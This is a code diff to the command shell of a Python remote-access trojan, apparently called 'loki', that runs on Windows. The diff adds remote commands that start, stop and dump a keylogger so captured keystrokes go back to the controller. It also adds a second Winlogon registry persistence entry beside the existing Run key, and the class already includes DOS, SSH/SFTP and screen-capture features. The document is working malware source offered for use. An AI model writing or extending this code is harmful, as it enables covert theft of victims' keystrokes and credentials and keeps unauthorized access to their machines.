@@ -9,8 +9,8 @@ from os import chdir
 from time import sleep
 from queue import Queue
 from tasks.dos import Cyclops
-from . import ssh, sftp, screen
 from threading import Thread, RLock 
+from . import ssh, sftp, screen, keylogger
 
 class Shell(object):
 
@@ -19,6 +19,7 @@ class Shell(object):
   self.disconnected = False
   self.services = services
   self.session = sess_obj
+  self.keylogger = None 
   self.is_alive = True 
   self.lock = RLock()
   self.task = None 
@@ -37,6 +38,9 @@ class Shell(object):
     9: self.remove_persist, 
     10: self.task_start,
     11: self.task_stop,
+    12: self.logger_start,
+    13: self.logger_stop,
+    14: self.logger_dump,
   }
 
   self.tasks = {
@@ -65,6 +69,17 @@ class Shell(object):
     self.display_text(data['args'])
     if code in self.cmds:
      Thread(target=self.cmds[code], args=[args], daemon=True).start()
+
+ def stop(self):
+  self.task.stop()
+  if self.ssh:
+   self.ssh.close()
+
+  if self.ftp:
+   self.ftp.close()
+
+  if self.keylogger:
+   self.keylogger.stop()
            
  def shell(self):
   t1 = Thread(target=self.listen_recv)
@@ -144,13 +159,30 @@ class Shell(object):
  def create_persist(self, args):
   if hasattr(sys, 'frozen'):
    _path = sys.executable
+   _cmd = r'reg add HKCU\Software\Microsoft\Windows\Winlogon /v loki /f /d "\"{}\""'.format(_path)
    cmd = r'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v loki /f /d "\"{}\""'.format(_path)
    subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+   subprocess.Popen(_cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
  def remove_persist(self, args):
   if hasattr(sys, 'frozen'):
+   _cmd = r'reg delete HKCU\Software\Microsoft\Windows\Winlogon /v loki /f'
    cmd = r'reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v loki /f'
    subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE) 
+   subprocess.Popen(_cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE) 
+
+ def logger_start(self, args):
+  if not self.keylogger:
+   self.keylogger = keylogger.Keylogger()
+  self.keylogger.start()
+
+ def logger_stop(self, args):
+  if self.keylogger:
+   self.keylogger.stop()
+
+ def logger_dump(self, args):
+  if self.keylogger:
+   self.send(-0, self.keylogger.dump())
 
  ######## Tasks ########
 
